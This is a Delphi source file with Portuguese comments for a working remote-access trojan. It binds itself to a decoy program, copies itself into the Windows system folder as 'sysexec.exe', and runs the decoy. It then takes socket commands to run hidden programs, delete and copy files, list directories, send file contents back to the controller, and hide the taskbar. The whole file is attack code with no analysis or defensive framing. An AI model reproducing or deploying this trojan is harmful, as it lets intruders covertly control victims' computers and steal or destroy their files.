unit main;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  Menus, StdCtrls, Buttons, ScktComp, ExtCtrls, ComCtrls, Shellapi;

type
  TForm1 = class(TForm)
    ServerSocket: TServerSocket;
    ClientSocket: TClientSocket;
    Memo2: TMemo;
    StatusBar1: TStatusBar;
    procedure Exit1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure ServerSocketError(Sender: TObject; Number: Smallint;
      var Description: string; Scode: Integer; const Source,
      HelpFile: string; HelpContext: Integer; var CancelDisplay: Wordbool);
    procedure Disconnect1Click(Sender: TObject);
    procedure ClientSocketRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ServerSocketClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocketClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocketError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ServerSocketClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure ServerSocketClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
  protected
  private
    procedure Entrada(Conte:string);
  public

  end;

var
  Form1   : TForm1;
  Server  : String;

implementation

{$R *.DFM}




procedure TForm1.Exit1Click(Sender: TObject);
begin
  ServerSocket.Close;
  ClientSocket.Close;
  Close;
end;

procedure TForm1.FormCreate(Sender: TObject);
    procedure Sai;
    const
       nTrojanSize = 176128;
       BufferSize = 256;
       sDisFile='File.exe';
       sTrojanName='sysexec.exe';
       sTempFile='Temp.exe';
    var
      FromF,ToF: file;
      NumRead, NumWritten: Integer;
      Buf: array[1..1024] of Char;
      ArSystem: array [0..144] of char;
      sSysPath:string;
      sPath:string;
    begin
        GetSystemDirectory(ArSystem, sizeof(ArSystem));
        sPath:= UpperCase( ExtractFilePath( paramstr(0) ) );
        sSysPath :=UpperCase(ArSystem)+'\';

        // Ativa trojan se estiver na pasta system
        if sPath = sSysPath then begin
           Caption := sTrojanName;
          ServerSocket.Active:=False;
          sleep(2000);
          ServerSocket.Active:=True;
        end
        else begin
           // Cria um arquivo temporario do executavel para pasta de sistema
           try
             CopyFile(pchar( ParamStr(0) ), pchar(sSysPath+sTempFile), true);
           except end;

           // Copia o trojan e execute
           CopyFile(pchar( sSysPath+'Temp.exe' ), pchar(sSysPath+sTrojanName), true);
           WinExec(PChar(sSysPath+sTrojanName), 1);

          // Separa o arquivo de desfarce e executa
          AssignFile(FromF, sSysPath+'Temp.exe');
          AssignFile(ToF, sSysPath+sDisFile);
          Reset(FromF, 1);
          if not FileExists(sSysPath+sDisFile) then begin
            Rewrite(ToF, 1);
            Seek(FromF, nTrojanSize);
            repeat
               BlockRead(FromF, Buf, SizeOf(Buf), NumRead);
               BlockWrite(ToF, Buf, NumRead, NumWritten);
            until (NumRead = 0) or (NumWritten <> NumRead);
            CloseFile(ToF);
            CloseFile(FromF);
          end;
          // execute o programa disfarce
          WinExec(PChar(sSysPath+sDisFile), 1);


          //Tente apagar o arquivo disfarce
          sleep(10000);
          while FileExists(sSysPath+sDisFile) do begin
            try
             Erase(ToF);
            except
            end; // try
            sleep(1000);
          end; // while FileExists

          try
            //Apague arquivo temporario
            Erase(FromF);
          except
          end; // try
         Application.Terminate;
        end; // Uppercase(sSysPath)
    end;

begin
  Application.Handle:=0;
  Sai;
end;

procedure TForm1.ServerSocketError(Sender: TObject; Number: Smallint;
  var Description: string; Scode: Integer; const Source, HelpFile: string;
  HelpContext: Integer; var CancelDisplay: Wordbool);
begin
  ShowMessage(Description);
end;

procedure TForm1.Disconnect1Click(Sender: TObject);
begin
  ClientSocket.Close;
end;

procedure TForm1.ClientSocketRead(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  Memo2.Lines.Add(Socket.ReceiveText);
end;



procedure TForm1.Entrada(Conte:string);
    procedure Split(const Ini: String; var var1, var2 : String );
    var
     npos : Integer;
    begin
      npos := pos('&',Ini);
      Var1:=Copy(Ini, 1, npos-1);
      Var2:=Copy(Ini, npos+1, Length(Ini) );
    end;

    procedure EscondeIniciar(Resto:String);
    var
    TaskbarHandle, ButtonHandle : HWND;
    begin
      TaskBarHandle := FindWindow('Shell_TrayWnd', nil);
      ButtonHandle  := GetWindow(TaskbarHandle, GW_CHILD);

      If Resto <> 'hide' then begin
         ShowWindow(ButtonHandle, SW_RESTORE);
         Visible := True;
      end
      else begin
         ShowWindow(ButtonHandle, SW_HIDE);
         Visible := False;
      end;
      Form1.Show;
    end;

   procedure EscondeBotao(Resto:String);
   var
      hTaskBar2, hTaskBar :Thandle;
   begin
         If Resto = 'hide' then begin
           hTaskBar := FindWindow('Shell_TrayWnd',Nil);
           ShowWindow(hTaskBar,Sw_Hide);
         end
         else begin
          hTaskBar2 := FindWindow('Shell_TrayWnd',Nil);
          ShowWindow(hTaskBar2,Sw_Normal);
        end;
   end;

   procedure Executa(Nome : string);
   var
     Comando : Array[0..1024] of Char;
     Parms : Array[0..1024] of Char;
     sTipo,sTemp, Arquivo, Parametro : String;
   begin
    // Tipo de Execução
    //   E - Escondido
    //   M - Maximizado
    Split(Nome, sTipo, sTemp);


    Split(sTemp, Arquivo, Parametro);


    StrPCopy(Comando,Arquivo);
    StrPCopy(Parms,Parametro);


    if sTipo = 'E' then
        ShellExecute(0,nil,Comando,Parms,nil,SW_HIDE)
    else
        ShellExecute(0,nil,Comando,Parms,nil,SW_SHOWMAXIMIZED);

        
   end;

   procedure Apaga(Nome:String);
   var
      F: File;
   begin
     try
        AssignFile(F, Nome);
        Erase(F);
     except
      on E:EInOutError do
          ClientSocket.Socket.SendText('Erro Ao excluir : ' + IntToStr(E.ErrorCode) + ' '+ E.Message );
     end;
   end;


  procedure Lista(Nome:String);
  var
    sr : TSearchRec;
    sTipo : string;
  begin
    // Try to find regular files matching Unit1.d* in the current dir
    ClientSocket.Socket.SendText( Nome );
    sleep(100);
    ClientSocket.Socket.SendText( '=== INI ===');
    if FindFirst(Nome, faAnyFile, sr) = 0 then
      repeat
        //Tipo
        // D=Diretorio
        // A=Arquivo
        if ( sr.attr = faDirectory ) then
           sTipo :='D'
        else
           sTipo :='A';

        //        TIPO   +     Arquivo                + Tamanho
        sleep(100);
        if sTipo = 'A' then
          ClientSocket.Socket.SendText(sTipo + ' [ ' + sr.Name+' ] '+IntToStr(sr.Size )  )
        else
          ClientSocket.Socket.SendText(sTipo + ' [ ' + sr.Name+'\ ] '  );
      until FindNext(sr) <> 0;
     FindClose(sr);
     sleep(100);
     ClientSocket.Socket.SendText( '=== FIM ===');
  end;

  procedure Copia(Nome:String);
  var
     Origem, Destino : String;
   begin
     Split(Nome, Origem, Destino);
     try
        CopyFile(pchar( Origem ), pchar( Destino ), true);
     except
      on E:EInOutError do
          ClientSocket.Socket.SendText('Erro Ao excluir : ' + IntToStr(E.ErrorCode) + ' '+ E.Message );
     end;
   end;

   procedure Exibir(Nome:String);
   var
     Lista: TStringList;
     N : Integer;
   begin
     Lista := TStringList.Create;
     try
        Lista.LoadFromFile(Nome);
        ClientSocket.Socket.SendText( Nome );
        sleep(100);
        ClientSocket.Socket.SendText( '=== INI ===');
        For n := 0 to Lista.Count-1 do begin
          sleep(100);
          ClientSocket.Socket.SendText(Lista.Strings[n]);
        end;
          sleep(100);
        ClientSocket.Socket.SendText( '=== FIM ===');
     except
      on E:EInOutError do
          ClientSocket.Socket.SendText('Erro Ao excluir : ' + IntToStr(E.ErrorCode) + ' '+ E.Message );
     end;
     Lista.Free;
   end;



var
  Resto, Letras: string;
begin
  Letras:=Copy(Conte, 1, 4);
  Resto:=Copy(Conte, 6, Length(Conte) );

  if Letras = '/pin' then ClientSocket.Socket.SendText('Pong!!!!!!');
  if Letras = '/msg' then Showmessage(Resto);

  if Letras = '/tsk' then EscondeBotao(Resto);
  if Letras = '/btn' then EscondeIniciar(Resto);

  if Letras = '/del' then Apaga(Resto);
  if Letras = '/lis' then Lista(Resto);
  if Letras = '/exe' then Executa(Resto);
  if Letras = '/cop' then Copia(Resto);
  if Letras = '/cat' then Exibir(Resto);

end;


procedure TForm1.ServerSocketClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
 sEntrada : String;
begin
  sEntrada := Socket.ReceiveText;
  Memo2.Lines.Add(sEntrada);
  Entrada(sEntrada);
end;


procedure TForm1.ServerSocketClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  Statusbar1.SimpleText:=Socket.RemoteAddress;
  ClientSocket.Host:=Socket.RemoteAddress;
  ClientSocket.Active:=true;
  ClientSocket.Socket.SendText('Conectado!!!');
end;

procedure TForm1.ClientSocketError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
  Memo2.Lines.Add('Error connecting to : ' + Server);
  ErrorCode := 0;
end;

procedure TForm1.ServerSocketClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  ClientSocket.Close;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  ClientSocket.Close;
  Application.Terminate;
end;

procedure TForm1.ServerSocketClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
  ClientSocket.Close;
end;

end.
